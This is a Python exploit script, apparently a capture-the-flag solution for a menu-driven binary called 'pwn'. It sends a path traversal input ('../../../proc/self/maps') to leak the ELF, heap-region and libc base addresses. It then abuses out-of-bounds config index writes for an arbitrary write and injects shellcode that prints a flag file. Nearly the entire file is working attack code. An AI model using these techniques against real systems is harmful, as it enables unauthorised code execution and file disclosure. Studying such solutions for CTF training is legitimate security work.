#!/usr/bin/env python3
#-*- coding: utf-8 -*-
#   expBy : @eastXueLian
#   Debug : ./exp.py debug  ./pwn -t -b b+0xabcd
#   Remote: ./exp.py remote ./pwn ip:port

from pwncli import *
cli_script()
set_remote_libc('libc.so.6')

io: tube = gift.io
elf: ELF = gift.elf
libc: ELF = gift.libc

i2b = lambda c : str(c).encode()
lg = lambda s : log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
debugB = lambda : input("\033[1m\033[33m[ATTACH ME]\033[0m")

# one_gadgets: list = get_current_one_gadget_from_libc(more=False)
CurrentGadgets.set_find_area(find_in_elf=True, find_in_libc=False, do_initial=False)

def cmd(choice):
    ru(b'Choice:\n')
    sl(i2b(choice))
def config(idx, data):
    cmd(2)
    ru(b'Config index:\n')
    sl(i2b(idx))
    ru(b'New config: \n')
    s(data)
def readInput(s1):
    cmd(1)
    ru(b'Chat ID:\n')
    sl(s1)

payload = b"../../../proc/self/maps"
readInput(payload)

elf_base = int(ru(b"000"), 16)
lg("elf_base")
ru(b"[heap]\n")
code_addr = int(ru(b"000"), 16)
lg("code_addr")
rl()
libc_base = int(ru(b"000"), 16)
lg("libc_base")

config_addr = elf_base + 0x4060
config(0, b"backup: 1")
config(2, p64(config_addr))
config(9, p64(code_addr))

shellcode = asm(shellcraft.cat("flag"))

for i in range( (len(shellcode) // 8) + 1):
    config( ( (code_addr - config_addr) // 8 ) + i, shellcode[8 * i:8 * (i+1)])


# config( ( (code_addr - config_addr) // 8 ) + 0, shellcode[:8])
# config( ( (code_addr - config_addr) // 8 ) + 1, shellcode[8 * 1:8 * 2])
# config( ( (code_addr - config_addr) // 8 ) + 2, shellcode[8 * 2:8 * 3])

ia()
